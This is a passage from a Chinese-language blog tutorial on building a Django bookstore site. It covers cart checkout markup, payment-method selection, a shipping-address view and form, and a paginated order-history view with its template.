class="string">"col04"</span>&gt;</span>&#123;&#123; book.unit &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>&#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col06"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"num_add"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"add fl"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">books_id</span>=<span class="string">&#123;&#123;</span> <span class="attr">book.id</span> &#125;&#125; <span class="attr">class</span>=<span class="string">"num_show fl"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; book.count &#125;&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"minus fl"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">a</span>&gt;</span>   </span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col07"</span>&gt;</span>&#123;&#123; book.amount &#125;&#125;元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col08"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"settlements"</span>&gt;</span></span><br><span class="line">    &#123; % csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">checked</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span>全选<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>合计(不含运费)：<span class="tag">&lt;<span class="name">span</span>&gt;</span>¥<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; total_price &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>共计<span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123; total_count &#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span>件商品<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"去结算"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>好，我们去结算功能也实现了。</p><h2 id="5，接下来我们将提交订单页面完善一下，完成去支付功能。将支付方式绑定value值，供提交。"><a href="#5，接下来我们将提交订单页面完善一下，完成去支付功能。将支付方式绑定value值，供提交。" class="headerlink" title="5，接下来我们将提交订单页面完善一下，完成去支付功能。将支付方式绑定value值，供提交。"></a>5，接下来我们将提交订单页面完善一下，完成去支付功能。将支付方式绑定value值，供提交。</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"cash"</span>&gt;</span>货到付款<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"weixin"</span>&gt;</span>微信支付<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span> <span class="attr">value</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"zhifubao"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span> <span class="attr">value</span>=<span class="string">"4"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"bank"</span>&gt;</span>银行卡支付<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查缺补漏，发现编辑收货地址功能还没有实现。我们先来编写用户中心地址页的接口。注意，要写在<code>users/views.py</code>中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">address</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''用户中心-地址页'''</span></span><br><span class="line">    <span class="comment"># 获取登录用户的id</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="comment"># 显示地址页面</span></span><br><span class="line">        <span class="comment"># 查询用户的默认地址</span></span><br><span class="line">        addr = Address.objects.get_default_address(passport_id=passport_id)</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/user_center_site.html'</span>, &#123;<span class="string">'addr'</span>: addr, <span class="string">'page'</span>: <span class="string">'address'</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 添加收货地址</span></span><br><span class="line">        <span class="comment"># 1.接收数据</span></span><br><span class="line">        recipient_name = request.POST.get(<span class="string">'username'</span>)</span><br><span class="line">        recipient_addr = request.POST.get(<span class="string">'addr'</span>)</span><br><span class="line">        zip_code = request.POST.get(<span class="string">'zip_code'</span>)</span><br><span class="line">        recipient_phone = request.POST.get(<span class="string">'phone'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2.进行校验</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> all([recipient_name, recipient_addr, zip_code, recipient_phone]):</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">'users/user_center_site.html'</span>, &#123;<span class="string">'errmsg'</span>: <span class="string">'参数不能为空!'</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3.添加收货地址</span></span><br><span class="line">        Address.objects.add_one_address(passport_id=passport_id,</span><br><span class="line">                                        recipient_name=recipient_name,</span><br><span class="line">                                        recipient_addr=recipient_addr,</span><br><span class="line">                                        zip_code=zip_code,</span><br><span class="line">                                        recipient_phone=recipient_phone)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4.返回应答</span></span><br><span class="line">        <span class="keyword">return</span> redirect(reverse(<span class="string">'user:address'</span>))</span><br></pre></td></tr></table></figure></p><p>然后配置urls.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^address/$'</span>, views.address, name=<span class="string">'address'</span>), <span class="comment"># 用户中心-地址页</span></span><br></pre></td></tr></table></figure></p><p>然后将user_center_site.html拷贝到templates/users文件夹下。并继承base.html。<br>然后改写模板。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"site_con"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>当前地址：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">        &#123;% if addr %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span>&#123;&#123; addr.recipient_addr &#125;&#125; （&#123;&#123; addr.recipient_name &#125;&#125; 收） &#123;&#123; addr.recipient_phone &#125;&#125;<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span>无<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>改写form提交表单。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/user/address/"</span>&gt;</span></span><br><span class="line">    &#123; % csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form_group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>收件人：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form_group form_group2"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>详细地址：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"site_area"</span> <span class="attr">name</span>=<span class="string">"addr"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form_group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮编：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"zip_code"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form_group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>手机：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"phone"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">class</span>=<span class="string">"info_submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>好，我们编辑地址的功能已经编写好了。</p><h2 id="6，完善用户中心"><a href="#6，完善用户中心" class="headerlink" title="6，完善用户中心"></a>6，完善用户中心</h2><p>接下来我们进一步完善一下用户中心，把用户中心的订单显示页面给做了。先来实现订单显示的后台接口。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/views.py</span></span><br><span class="line"><span class="keyword">from</span> django.core.paginator <span class="keyword">import</span> Paginator</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">(request, page)</span>:</span></span><br><span class="line">    <span class="string">'''用户中心-订单页'''</span></span><br><span class="line">    <span class="comment"># 查询用户的订单信息</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取订单信息</span></span><br><span class="line">    order_li = OrderInfo.objects.filter(passport_id=passport_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历获取订单的商品信息</span></span><br><span class="line">    <span class="comment"># order-&gt;OrderInfo实例对象</span></span><br><span class="line">    <span class="keyword">for</span> order <span class="keyword">in</span> order_li:</span><br><span class="line">        <span class="comment"># 根据订单id查询订单商品信息</span></span><br><span class="line">        order_id = order.order_id</span><br><span class="line">        order_books_li = OrderGoods.objects.filter(order_id=order_id)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算商品的小计</span></span><br><span class="line">        <span class="comment"># order_books -&gt;OrderGoods实例对象</span></span><br><span class="line">        <span class="keyword">for</span> order_books <span class="keyword">in</span> order_books_li:</span><br><span class="line">            count = order_books.count</span><br><span class="line">            price = order_books.price</span><br><span class="line">            amount = count * price</span><br><span class="line">            <span class="comment"># 保存订单中每一个商品的小计</span></span><br><span class="line">            order_books.amount = amount</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 给order对象动态增加一个属性order_books_li,保存订单中商品的信息</span></span><br><span class="line">        order.order_books_li = order_books_li</span><br><span class="line">    </span><br><span class="line">    paginator = Paginator(order_li, <span class="number">3</span>)      <span class="comment"># 每页显示3个订单</span></span><br><span class="line">    </span><br><span class="line">    num_pages = paginator.num_pages</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> page:        <span class="comment"># 首次进入时默认进入第一页</span></span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">''</span> <span class="keyword">or</span> int(page) &gt; num_pages:</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = int(page)</span><br><span class="line">        </span><br><span class="line">    order_li = paginator.page(page)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> num_pages &lt; <span class="number">5</span>:</span><br><span class="line">        pages = range(<span class="number">1</span>, num_pages + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> page &lt;= <span class="number">3</span>:</span><br><span class="line">        pages = range(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> num_pages - page &lt;= <span class="number">2</span>:</span><br><span class="line">        pages = range(num_pages - <span class="number">4</span>, num_pages + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pages = range(page - <span class="number">2</span>, page + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'order_li'</span>: order_li,</span><br><span class="line">        <span class="string">'pages'</span>: pages,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'users/user_center_order.html'</span>, context)</span><br></pre></td></tr></table></figure></p><p>然后配置urls.py。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    url(<span class="string">r'^order/(?P&lt;page&gt;\d+)?/?$'</span>, views.order, name=<span class="string">'order'</span>), <span class="comment"># 用户中心-订单页  增加分页功能</span></span><br></pre></td></tr></table></figure></p><p>然后将user_center_order.html拷贝到templates/users文件夹下，并继承base.html。<br>然后改写模板中的元素，使得后端可以渲染。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书店-首页&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_menu_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>用户中心<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:user' %&#125;"</span>&gt;</span>· 个人信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:order' %&#125;"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>· 全部订单<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:address' %&#125;"</span>&gt;</span>· 收货地址<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_content clearfix"</span>&gt;</span></span><br><span class="line">                &#123; % csrf_token %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title2"</span>&gt;</span>全部订单<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                &#123;# OrderInfo #&#125;</span><br><span class="line">                &#123;% for order in order_li %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"order_list_th w978 clearfix"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span>&#123;&#123; order.create_time &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span>订单号：&#123;&#123; order.order_id &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02 stress"</span>&gt;</span>&#123;&#123; order.status &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"order_list_table w980"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"55%"</span>&gt;</span></span><br><span class="line">                                &#123;# 遍历出来的order_books是一个OrderGoods对象 #&#125;</span><br><span class="line">                                &#123;% for order_books in order.order_books_li %&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"order_book_list clearfix"</span>&gt;</span>                   </span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static order_books.books.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span>&#123;&#123; order_books.books.name &#125;&#125;<span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; order_books.books.price &#125;&#125;元/&#123;&#123; order_books.books.unit &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>&#123;&#123; order_books.count &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>&#123;&#123; order_books.amount &#125;&#125;元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                                &#123;% endfor %&#125;</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"15%"</span>&gt;</span>&#123;&#123; order.total_price &#125;&#125;元<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"15%"</span>&gt;</span>&#123;&#123; order.status &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"15%"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">pay_method</span>=<span class="string">"&#123;&#123; order.pay_method &#125;&#125;"</span> <span class="attr">order_id</span>=<span class="string">"&#123;&#123; order.order_id &#125;&#125;"</span> <span class="attr">order_status</span>=<span class="string">"&#123;&#123; order.status &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"oper_btn"</span>&gt;</span>去付款<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pagenation"</span>&gt;</span></span><br><span class="line">                    &#123;% if order_li.has_previous %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:order' page=order_li.previous_page_number %&#125;"</span>&gt;</span>上一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% endif %&#125;</span><br><span class="line">                    &#123;% for page in pages %&#125;</span><br><span class="line">                        &#123;% if page == order_li.number %&#125;</span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:order' page=page 